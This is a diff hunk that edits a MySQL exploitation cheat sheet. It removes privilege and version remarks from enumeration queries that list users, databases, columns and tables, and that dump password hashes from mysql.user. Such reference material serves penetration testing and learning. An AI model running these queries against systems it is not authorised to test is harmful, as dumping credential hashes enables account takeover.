@@ -103,12 +103,12 @@ Mysql exploitation
     *SELECT user();
 SELECT system_user();*
     List all Users
-    *SELECT user FROM mysql.user; — priv*
+    *SELECT user FROM mysql.user;*
     List password hashes
-    *SELECT host, user, password FROM mysql.user; — priv*
+    *SELECT host, user, password FROM mysql.user;*
     List databases
-    *SELECT schema_name FROM information_schema.schemata; — for MySQL >= v5.0
-    SELECT distinct(db) FROM mysql.db — priv*
+    *SELECT schema_name FROM information_schema.schemata;
+    SELECT distinct(db) FROM mysql.db*
     List columns
     *SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE table_schema != ‘mysql’ AND table_schema != ‘information_schema’*
     List tables
